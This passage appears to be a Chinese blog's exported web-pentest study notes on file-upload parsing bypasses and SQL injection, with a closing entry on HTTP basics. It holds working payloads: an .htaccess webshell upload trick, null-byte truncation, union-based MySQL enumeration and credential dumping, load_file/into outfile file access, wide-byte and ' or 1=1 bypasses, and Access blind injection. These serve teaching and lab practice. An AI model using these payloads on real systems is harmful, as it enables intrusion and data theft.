<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.创建一个htaccess文件:</span><br><span class="line">代码内容:</span><br><span class="line">&lt;FilesMatch “_php.gif”&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">2.实用编辑器上传htaccess文件.</span><br><span class="line">http://www.2cto.com /FCKeditor/editor/filemanager/upload/test.html</span><br><span class="line">http://www.2cto.com /FCKeditor/editor/filemanager/browser/default/connectors/test.html</span><br><span class="line">3.上传shell.php.gif</span><br><span class="line">4.上传后shell.php.gif, 会自动被改名为shell_php.gif</span><br><span class="line">5.访问http://www.2cto.com /上传目录/shell_php.gif</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-7-配合其它规则"><a href="#3-7-配合其它规则" class="headerlink" title="3.7-配合其它规则"></a>3.7-配合其它规则</h3><ul>
<li><p>0x00截断</p>
<ul>
<li><p>基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
</li>
<li><p>test.php(0x00).jpg</p>
<p>  test.php%00.jpg</p>
</li>
<li><p>路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</p>
</li>
<li><p>伪代码演示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">name= getname(httprequest) <span class="comment">//假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span></span><br><span class="line">type =gettype(name)        <span class="comment">//而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span></span><br><span class="line"><span class="keyword">if</span>(type == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   <span class="comment">//但在这里却是以 0x00 作为文件名截断</span></span><br><span class="line"><span class="comment">//最后以 help.asp 存入路径里</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="3-8-WAF绕过"><a href="#3-8-WAF绕过" class="headerlink" title="3.8-WAF绕过"></a>3.8-WAF绕过</h3>]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>上传解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>注入相关问题</title>
    <url>/2018/01/22/web/%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="注入相关问题"><a href="#注入相关问题" class="headerlink" title="注入相关问题"></a>注入相关问题</h1><h2 id="01-Base64注入"><a href="#01-Base64注入" class="headerlink" title="01-Base64注入"></a>01-Base64注入</h2><ul>
<li>Web自身接受处理时，可能存在加解密算法，故注入时也要相符</li>
</ul>
<ul>
<li><p>传输时加密字符串 id=MSBvcmRlciBieSAx</p>
</li>
<li><p>接受的时候进行解密 id=1 order by 1</p>
</li>
<li><p>带入数据库查询</p>
</li>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/17562541.jpg" alt></p>
</li>
</ul>
<a id="more"></a>
<h2 id="02-urldecode注入"><a href="#02-urldecode注入" class="headerlink" title="02-urldecode注入"></a>02-urldecode注入</h2><ul>
<li>特殊符号才会进行加解码</li>
</ul>
<h2 id="03-二次注入"><a href="#03-二次注入" class="headerlink" title="03-二次注入"></a>03-二次注入</h2><ul>
<li><p>二次注入产生在数据库插入语句中（insert update）</p>
</li>
<li><p>程序在过滤sql注入，第一次采用过滤机制(转义或加解密等)接受数据，</p>
</li>
<li><p>第一次：创建简历 插入数据到数据库 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> qs_resume (<span class="string">`uid`</span>, <span class="string">`title`</span>, <span class="string">`fullname`</span>, <span class="string">`sex`</span>, <span class="string">`sex_cn`</span>, <span class="string">`birthdate`</span>, <span class="string">`height`</span>, <span class="string">`marriage`</span>, <span class="string">`marriage_cn`</span>, <span class="string">`experience`</span>, <span class="string">`experience_cn`</span>, <span class="string">`householdaddress`</span>, <span class="string">`education`</span>, <span class="string">`education_cn`</span>, <span class="string">`tag`</span>, <span class="string">`telephone`</span>, <span class="string">`email`</span>, <span class="string">`email_notify`</span>, <span class="string">`address`</span>, <span class="string">`website`</span>, <span class="string">`qq`</span>, <span class="string">`refreshtime`</span>, <span class="string">`subsite_id`</span>, <span class="string">`display_name`</span>, <span class="string">`audit`</span>, <span class="string">`addtime`</span>) <span class="keyword">VALUES</span> (<span class="string">'3'</span>, <span class="string">'aaaaa123'</span>, <span class="string">'xiaodi'</span>, <span class="string">'1'</span>, <span class="string">'\xC4\xD0'</span>, <span class="string">'1992'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'δ\xBB\xE9'</span>, <span class="string">'76'</span>, <span class="string">'1-3\xC4\xEA'</span>, <span class="string">'\xB4\xF3\xCBմ\xF2'</span>, <span class="string">'66'</span>, <span class="string">'\xB8\xDF\xD6\xD0'</span>, <span class="string">'155,\xD0\xCE\xCF\xF3\xBA\xC3'</span>, <span class="string">'13000011444'</span>, <span class="string">'xxx00123@qq.com'</span>, <span class="string">'0'</span>, <span class="string">'\xCE人\xCA\xD0'</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'1465041463'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1465041463'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>第二次：更新数据库，将数据进行展示 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> qs_resume <span class="keyword">SET</span> <span class="string">`photo`</span>=<span class="string">'0'</span>, <span class="string">`complete`</span>=<span class="string">'1'</span>, <span class="string">`complete_percent`</span>=<span class="string">'60'</span>, <span class="string">`key`</span>=<span class="string">'xiaodi'</span> <span class="keyword">select</span> <span class="keyword">user</span>() \xCF\xEEĿ\xBE\xAD\xC0\xED/\xB2\xFAƷ\xBE\xAD\xC0\xED xiaodi0  \xCF\xEEĿ<span class="number">00</span> \xCF\xEEĿ\xBE\xAD\xC0\xED \xBE\xAD\xC0\xED00 \xB2\xFAƷ<span class="number">00</span> \xB2\xFAƷ\xBE\xAD\xC0\xED \xBBָ\xB400 ͨ\xBA\xBD00 \xB7\xA8\xB9\xFA00 \xB8\xDF\xD6\xD000 dad <span class="string">', `refreshtime`='</span><span class="number">1465041562</span><span class="string">' WHERE uid='</span><span class="number">3</span><span class="string">' AND id='</span><span class="number">2</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql注入相关</title>
    <url>/2018/01/22/web/Mysql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="Mysql注入相关"><a href="#Mysql注入相关" class="headerlink" title="Mysql注入相关"></a>Mysql注入相关</h1><h2 id="01-一般注入"><a href="#01-一般注入" class="headerlink" title="01-一般注入"></a>01-一般注入</h2><ul>
<li><p>Access数据库结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access数据库</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br></pre></td></tr></table></figure>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>Mysql数据库结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库A</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br><span class="line">			</span><br><span class="line">数据库B</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br></pre></td></tr></table></figure>
</li>
<li><p>Php+mysql注入（5.0以上）</p>
<ul>
<li>步骤：<ol>
<li>判断注入</li>
<li>猜解字段数</li>
<li>猜数据库名</li>
<li>猜表名</li>
<li>猜列名</li>
<li>猜数据</li>
</ol>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>相关语句</p>
<ul>
<li><p>注入语句</p>
<p><code>http://127.0.0.1/wl13/sql.php?x=1 union select 1,2,3</code></p>
</li>
<li><p>查询信息</p>
<p><code>http://127.0.0.1/wl13/sql.php?x=1%20union%20select%20database(),version(),user()</code></p>
</li>
<li><p>查询sqlin（hex编码）下的表名信息</p>
<p><code>http://127.0.0.1/wl13/sql.php?x=1 union select table_name,2,3 from information_schema.tables where table_schema=0x73716C696E20</code></p>
</li>
<li><p>选取指定表名key，获取列名信息</p>
<p><code>http://127.0.0.1/wl13/sql.php?x=1 union select column_name,2,3 from information_schema.columns where table_name=0x6B6579</code></p>
</li>
<li><p>直接获取key表名下的data列名的数据</p>
<p><code>http://127.0.0.1/wl13/sql.php?x=1%20union%20select%20data,2,3%20from%20sqlin.key</code></p>
</li>
</ul>
</li>
<li><p>Php+mysql注入点 这样写猜表名是否正确，给出理由？</p>
<ul>
<li><a href="http://127.0.0.1/wl13/sql.php?x=1" target="_blank" rel="noopener">http://127.0.0.1/wl13/sql.php?x=1</a> union select 1,2,3 from admin</li>
<li>这样猜解表名就是暴力猜解</li>
</ul>
</li>
<li><p>注入函数</p>
<ul>
<li>数据库名 database()</li>
<li>数据库版本 version()</li>
<li>数据库用户 user()</li>
<li>操作系统 @@version_compile_os</li>
</ul>
</li>
<li><p>Mysql5.0 注入（有根据）</p>
<ul>
<li>数据库中“.”代表下一级</li>
</ul>
</li>
</ul>
<pre><code>- Information_schema：
  - mysql5.0及以上版本自带数据库
  - 存储有mysql所有数据库下的表名及列名信息
- Information_schema.tables：存储所有表名信息的表
- Table_name：表名
- table_schema：数据库名
- Column_name：列名
- information_schema.columns：存储所有列名信息的表
</code></pre><ul>
<li><p>问题：</p>
<ul>
<li><p>注入产生的地方在那里？<br>答：接受参数值未进行过滤</p>
</li>
<li><p>如何修复此类注入</p>
<ul>
<li><p>根据参数值的规律过滤（数字，过滤非数字）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-19/45925248.jpg" alt></p>
</li>
<li><p>指定关键字过滤（select union等关键字）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-19/78208784.jpg" alt></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="02-注入进阶"><a href="#02-注入进阶" class="headerlink" title="02-注入进阶"></a>02-注入进阶</h2><h3 id="2-1-权限入侵"><a href="#2-1-权限入侵" class="headerlink" title="2.1-权限入侵"></a>2.1-权限入侵</h3><ul>
<li><p>不同数据库用户对应的权限不同：</p>
<ul>
<li>Root用户：管理所有数据库，文件读取，文件写入</li>
<li>普通用户：管理其对应的数据库，不可文件读取和写入</li>
</ul>
</li>
<li><p>注入点用户</p>
<ul>
<li><p>注入点的用户权限：网站自身连接数据库时，脚本连接用户 == 注入点的用户</p>
</li>
<li><p>采用user()获取当前注入点的用户名</p>
</li>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-19/69811165.jpg" alt></p>
</li>
</ul>
</li>
</ul>
<h3 id="2-2-文件读取及写入"><a href="#2-2-文件读取及写入" class="headerlink" title="2.2-文件读取及写入"></a>2.2-文件读取及写入</h3><ul>
<li><p>文件读取及写入</p>
<ul>
<li><p>读取</p>
<p><code>http://127.0.0.1/wl13/sql.php?x=1%20union%20seleCT%20load_file(%27d:/test.txt%27),2,3</code></p>
</li>
<li><p>写入</p>
<p><code>http://127.0.0.1/wl13/sql.php?x=1 union selecT &#39;aaaa&#39;,2,3 into outfile &#39;d:/test2.txt&#39;</code></p>
</li>
</ul>
</li>
<li><p>网站绝对路径获取方法</p>
<ul>
<li>报错显示</li>
<li>漏洞爆错（如百度，phpcms 爆路径）</li>
<li>遗留文件<ul>
<li>信息泄露</li>
<li>Phpinfo.php info.php php.php test.php</li>
<li>最常见利用phpinfo()函数</li>
</ul>
</li>
<li>读取网站配置文件</li>
<li>社工（搜索引擎）</li>
</ul>
</li>
<li><p>路径相关问题</p>
<ul>
<li>盘符符号问题：不使用“\”，使用“/”或“\”</li>
<li>符号，编码问题：编码即不使用单引号，单引号即不使用编码</li>
</ul>
</li>
</ul>
<h2 id="03-其它注入姿势"><a href="#03-其它注入姿势" class="headerlink" title="03-其它注入姿势"></a>03-其它注入姿势</h2><ul>
<li>巧用mysql sql语句中的注释符<ul>
<li><code>--</code></li>
<li><code>#</code></li>
<li><code>/**/</code></li>
<li>其它</li>
</ul>
</li>
</ul>
<ul>
<li><p>跨库注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站A 数据库A</span><br><span class="line">网站B 数据库B</span><br><span class="line"></span><br><span class="line">Mysql</span><br><span class="line">数据库A</span><br><span class="line">数据库B</span><br><span class="line"></span><br><span class="line">目的：渗透网站B，获取数据库B</span><br><span class="line">网站B未检测到漏洞，无法进行渗透</span><br><span class="line">思路：通过A网站注入点，跨库注入B数据库，从而对网站B进行渗透</span><br></pre></td></tr></table></figure>
</li>
<li><p>独立服务器与VPS服务器</p>
<ul>
<li>独立服务器：<ul>
<li>所有数据库</li>
</ul>
</li>
<li>Vps服务器<ul>
<li>部分数据库</li>
<li>Vps1用户=vps1 web</li>
<li>Vps2用户=vps2 web</li>
<li>Vps3用户==vps3 web</li>
</ul>
</li>
</ul>
</li>
<li><p>注入工具抓包分析</p>
<ul>
<li><p>抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/wl13/sql.php?x=999999.9+union+all+select+%28select+distinct+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28schema_name+as+char%29%29%29%2C0x27%2C0x7e%29+from+%60information_schema%60.schemata+limit+14%2C1%29%2C0x31303235343830303536%2C0x31303235343830303536--</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij</span><br><span class="line"><span class="attribute">Connection</span>: Close</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>获取所有数据库名的注入语句</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http://127.0.0.1//wl13/sql.php?</span></span><br><span class="line">x=1 union all select (select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit </span><br><span class="line"><span class="attribute">13,1),0x31303235343830303536,0x31303235343830303536--</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取指定数据库名下的表名信息</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/wl13/sql.php?x=999999.9+union+all+select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28group_concat%28table_name%29+as+char%29%29%29%2C0x27%2C0x7e%29+from+%60information_schema%60.tables+where+table_schema%3D0x6874747073716C696E%29%2C0x31303235343830303536%2C0x31303235343830303536-- HTTP/1.1</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1///wl13/sql.php?x=1 union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(table_name) as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x6874747073716C696E),0x31303235343830303536,0x31303235343830303536--</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取指定表名下的列名信息</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1///wl13/sql.php?x=1 union all select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(column_name) as char))),0x27,0x7e) from `information_schema`.columns where table_name=0x61646D696E),0x31303235343830303536,0x31303235343830303536--</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取指定数据:</p>
<p><code>http://127.0.0.1///wl13/sql.php?x=1 union select username,password,3 from httpsqlin.admin</code></p>
</li>
</ul>
<ul>
<li><p>查询意义</p>
<ul>
<li>Version()：information_schema是否存在</li>
<li>User()：判断权限</li>
<li>Database()：获取数据</li>
<li>@@version_compile_os：<ul>
<li>判断操作系统</li>
<li>提示注入的大小写问题</li>
<li>windows 大小写不敏感 linux 大小写敏感）</li>
</ul>
</li>
</ul>
</li>
<li><p>注入工具使用</p>
<ul>
<li>sqlmap注入神器</li>
<li>穿山甲，萝卜头等</li>
</ul>
</li>
</ul>
<h2 id="04-防注入及其绕过"><a href="#04-防注入及其绕过" class="headerlink" title="04-防注入及其绕过"></a>04-防注入及其绕过</h2><ul>
<li><p>防注入措施之转义</p>
<ul>
<li>魔术引号开启：Php.ini文件中magic_quote_gpc=on 开启</li>
<li>函数限制：addslashes 函数</li>
</ul>
</li>
<li><p>作用：</p>
<ul>
<li>所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符</li>
<li>自动加上一个反斜线进行转义。</li>
</ul>
</li>
<li><p>绕过思路</p>
<ul>
<li><p>宽字节注入</p>
<ul>
<li><p>中文或乱码字符占两个字节，符号或英文数字占一个字节</p>
</li>
<li><p>\‘ = 两个字节</p>
</li>
<li><p>如%df</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/18211067.jpg" alt></p>
</li>
</ul>
</li>
<li><p>编码注入</p>
</li>
</ul>
</li>
</ul>
<h2 id="05-简单分类"><a href="#05-简单分类" class="headerlink" title="05-简单分类"></a>05-简单分类</h2><ul>
<li>根据参数（参数值类型注入方式）<ul>
<li>数字：<ul>
<li><code>www.xxxx.com/news.php?id=1</code></li>
<li><code>Select * from news where id=1</code></li>
</ul>
</li>
<li>字符：<ul>
<li><code>www.xxxx.com/news.php?name=小迪</code></li>
<li><code>Select * from news where name=’xiaodi’</code></li>
</ul>
</li>
<li>搜索：<ul>
<li><code>www.xxxx.com/news.php?search=小迪 搜索框</code></li>
<li><code>Select * from news where name like ‘%xiaodi%’
order by username</code></li>
</ul>
</li>
</ul>
</li>
<li>根据提交方式<ul>
<li>GET注入</li>
<li>POST注入<ul>
<li>登陆框注入</li>
<li>如，后台登录bypass</li>
<li>利用万能密码，如<code>&#39; or 1=1</code></li>
</ul>
</li>
<li>Cookie注入<ul>
<li><code>$id=$_COOKIE[&#39;id&#39;]</code></li>
<li>接受cookie提交方式下的参数名id的值并赋值给变量id</li>
</ul>
</li>
<li>http请求头注入<ul>
<li>利用php全局变量，$_SERVER</li>
<li>如，<code>$id=$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code></li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Access注入相关</title>
    <url>/2018/01/22/web/Access%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="Access注入相关"><a href="#Access注入相关" class="headerlink" title="Access注入相关"></a>Access注入相关</h1><h2 id="01-注入简介"><a href="#01-注入简介" class="headerlink" title="01-注入简介"></a>01-注入简介</h2><ul>
<li><p>URL分析</p>
<p>网站地址：<code>&lt;http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513&gt;</code></p>
<ul>
<li>网站地址：<code>&lt;http://127.0.0.1/0/&gt;</code></li>
<li>文件目录：Production</li>
<li>文件名：PRODUCT_DETAIL.asp</li>
<li>参数名：id</li>
<li>参数值：1513</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>Sql注入原理分析</p>
<ul>
<li>网站程序存在可控传递参数</li>
<li>参数未进行过滤直接带入数据库查询</li>
<li>导致攻击者可通过传递恶意sql语句代码进行执行攻击。</li>
</ul>
</li>
<li><p>判断注入 </p>
<ul>
<li>单引号/双引号</li>
<li>and 1=1，or 1=1等</li>
</ul>
</li>
<li><p>Sql注入产生条件</p>
<ol>
<li>必须有参数传递</li>
<li>参数值带入数据库查询并执行</li>
</ol>
<ul>
<li><p>习题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.下面那些地址可能存在sql注入？</span><br><span class="line">A.www.xiaodi8.com/news.asp</span><br><span class="line">B.www.xiaodi8.com/index.asp?page=11</span><br><span class="line">C.www.xiaodi8.com/news.asp?id=1&amp;page=2</span><br><span class="line">D.www.xiaodi8.com/?id=11	</span><br><span class="line"></span><br><span class="line">2.已知xiaodi8.com/news.asp?id=1&amp;page=1中参数id存在注入，下面那个注入测试正确？</span><br><span class="line">A.www.xiaodi8.com/news.asp?id=1 and 1=1&amp;page=1</span><br><span class="line">B.www.xiaodi8.com/news.asp?id=1&amp;page=1 and 1=1</span><br><span class="line">C.www.xiaodi8.com/news.asp?id=1 and 1=1&amp;page=1 and 1=1</span><br><span class="line"></span><br><span class="line">xiaodi8.com/news.asp?id=1&amp;page=1 and 1=1 将注入参数设为page（工具检测不出）</span><br><span class="line">xiaodi8.com/news.asp?page=1&amp;id=1 将注入参数设为id</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>实例说明</p>
<ul>
<li><p>PRODUCT_DETAIL.asp代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">id=request(&quot;id&quot;) </span><br><span class="line">&apos;接受参数名id的值并赋值给变量id （前面id=变量，后面id=参数名）</span><br><span class="line">sql=&quot;select * from product where id=&quot;&amp;id  </span><br><span class="line">&apos;组合变量id的sql语句</span><br><span class="line">set rs=conn.execute(sql) </span><br><span class="line">&apos;执行sql语句</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513" target="_blank" rel="noopener">http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513</a></p>
<ul>
<li>select * from product where id=1513</li>
</ul>
</li>
<li><p><a href="http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513’" target="_blank" rel="noopener">http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513’</a></p>
<ul>
<li>select * from product where id=1513’ </li>
<li>页面报错，无此id</li>
</ul>
</li>
<li><p><a href="http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513" target="_blank" rel="noopener">http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513</a> and 1=1</p>
<ul>
<li>select * from product where id=1513 and 1=1</li>
<li>真且真=真 返回正常</li>
</ul>
</li>
<li><p><a href="http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513" target="_blank" rel="noopener">http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513</a> and 1=11</p>
<ul>
<li>select * from product where id=1513 and 1=11</li>
<li>真且假=假 返回错误</li>
</ul>
</li>
</ul>
</li>
<li><p>数学逻辑运算符：或 且 非(or and xor)</p>
<ul>
<li>真且真=真</li>
<li>假且真=假</li>
<li>真或真=真</li>
<li>真或假=真</li>
</ul>
</li>
<li><p>环境搭建：</p>
<ul>
<li>软件搭建</li>
<li>iis6.0搭建</li>
</ul>
</li>
<li><p>Access注入是暴力猜解</p>
</li>
<li><p>Access数据结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access数据库</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="02-联合查询法"><a href="#02-联合查询法" class="headerlink" title="02-联合查询法"></a>02-联合查询法</h2><ul>
<li><p>大体步骤</p>
<ul>
<li>判断注入</li>
<li>猜解表名</li>
<li>猜解列名</li>
<li>猜解数据</li>
</ul>
</li>
<li><p>举例</p>
<ul>
<li><p>Order by 22 22 代表查询的列名的数目有22个</p>
<p><code>http://www.test.com/Production/PRODUCT_DETAIL.asp?id=1513 order by 22 正常</code></p>
<p><code>http://www.test.com/Production/PRODUCT_DETAIL.asp?id=1513 order by 23 错误</code></p>
</li>
<li><p>猜解表名 确定存在admin表名</p>
<p><code>http://www.test.com/Production/PRODUCT_DETAIL.asp?id=1513UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22from admin</code></p>
</li>
<li><p>猜解列名 猜解数据</p>
<p><code>http://www.test.com/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin</code></p>
</li>
</ul>
</li>
<li><p>表名和列名猜解成功率不是百分百，猜解不到解决办法</p>
<ul>
<li>字典文件收集（社工）</li>
<li>Access偏移注入</li>
</ul>
</li>
<li><p>工具猜解字典文件设置，如</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-19/62609928.jpg" alt></p>
</li>
</ul>
<h2 id="03-逐字猜解法"><a href="#03-逐字猜解法" class="headerlink" title="03-逐字猜解法"></a>03-逐字猜解法</h2><ul>
<li><p>查表：<code>and exists (select * from 表名)</code></p>
</li>
<li><p>查列：<code>and exists (select 列名 from 表名)</code></p>
</li>
<li><p>查数据：</p>
<ul>
<li>确定长度 ：<code>and (select top 1 len(列名) from admin)=5</code></li>
<li>确定asc数据(asc编码)： <code>and (select top 1 asc(mid(列名,位数,1)) from admin)=97</code></li>
</ul>
</li>
<li><p>ASCII编码</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-19/3882214.jpg" alt></p>
</li>
<li><p>拓展</p>
<ul>
<li><p>抓包分析注入工具核心注入语句</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-19/97682372.jpg" alt></p>
</li>
<li><p>利用自己的编程技能实现山寨工具</p>
</li>
</ul>
</li>
<li><p>思考：</p>
<ul>
<li>判断注入，and 1=1 and 1=2 ‘ 判断都出现错误，我们怎么知道是否有注入点</li>
</ul>
</li>
</ul>
<h2 id="04-工具法"><a href="#04-工具法" class="headerlink" title="04-工具法"></a>04-工具法</h2><ul>
<li>注入工具：<ul>
<li>啊D，明小子，穿山甲，萝卜头，sqlmap等</li>
</ul>
</li>
<li>工具功能性：<ul>
<li>支持数据库类型，</li>
<li>支持注入类型，</li>
<li>注入突破类型，</li>
<li>工具速度</li>
</ul>
</li>
</ul>
<h2 id="05-偏移注入"><a href="#05-偏移注入" class="headerlink" title="05-偏移注入"></a>05-偏移注入</h2><ul>
<li>access注入中，表名、列名无法获取<ul>
<li>表名获取失败解决办法<ul>
<li>社工</li>
<li>观察网站url，如<a href="http://www.xxx.com/pw_index.asp，pw前缀" target="_blank" rel="noopener">www.xxx.com/pw_index.asp，pw前缀</a></li>
</ul>
</li>
<li>列名获取失败解决办法<ul>
<li>社工</li>
<li>右键源码看字段名，有时会一样</li>
<li>access偏移注入</li>
</ul>
</li>
</ul>
</li>
<li>偏移注入<ul>
<li>用<code>*</code>代替字符，计算<code>*</code>代替字符的位数</li>
<li>参考链接：<a href="http://tieba.baidu.com/p/4468814212" target="_blank" rel="noopener">http://tieba.baidu.com/p/4468814212</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP数据包相关</title>
    <url>/2018/01/22/web/HTTP%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="HTTP数据包相关"><a href="#HTTP数据包相关" class="headerlink" title="HTTP数据包相关"></a>HTTP数据包相关</h1><h2 id="01-HTTP请求模型"><a href="#01-HTTP请求模型" class="headerlink" title="01-HTTP请求模型"></a>01-HTTP请求模型</h2><blockquote>
<p><a href="http://www.cnblogs.com/riky/archive/2007/04/09/705848.html" target="_blank" rel="noopener">http://www.cnblogs.com/riky/archive/2007/04/09/705848.html</a></p>
</blockquote>
<h3 id="1-1-连接至Web服务器"><a href="#1-1-连接至Web服务器" class="headerlink" title="1.1-连接至Web服务器"></a>1.1-连接至Web服务器</h3><ul>
<li>一个客户端应用（如Web浏览器）打开到Web服务器的HTTP端口的一个套接字（缺省为80）。</li>
<li>例如：<a href="http://www.myweb.com:8080/index.html" target="_blank" rel="noopener">http://www.myweb.com:8080/index.html</a><br>在Java中，这将等同于代码：<br><code>Soceet socket=new Socket(&quot;www.myweb.com&quot;,8080);</code><br><code>InputStream in=socket.getInputStream();</code><br><code>OutputStream out=socket.getOutputStream();</code></li>
</ul>
<a id="more"></a>
<h3 id="1-2-发送HTTP请求"><a href="#1-2-发送HTTP请求" class="headerlink" title="1.2-发送HTTP请求"></a>1.2-发送HTTP请求</h3><ul>
<li>通过连接，客户端写一个ASCII文本请求行，后跟0或多个HTTP头标，一个空行和实现请求的任意数据</li>
<li>一个请求由四个部分组成：请求行、请求头标、空行和请求数据<ul>
<li>请求行：请求行由三个标记组成：请求方法、请求URI和HTTP版本，它们用空格分隔<ul>
<li>例如：GET /index.html HTTP/1.1</li>
<li>HTTP规范定义了8种可能的请求方法：<ul>
<li>GET：检索URI中标识资源的一个简单请求</li>
<li>HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档</li>
<li>POST：服务器接受被写入客户端输出流中的数据的请求</li>
<li>PUT：服务器保存请求数据作为指定URI新内容的请求</li>
<li>DELETE：服务器删除URI中命名的资源的请求</li>
<li>OPTIONS：关于服务器支持的请求方法信息的请求</li>
<li>TRACE：Web服务器反馈Http请求和其头标的请求</li>
<li>CONNECT：已文档化但当前未实现的一个方法，预留做隧道处理</li>
</ul>
</li>
</ul>
</li>
<li>请求头标：由关键字/值对组成，每行一对，关键字和值用冒号（:）分隔<ul>
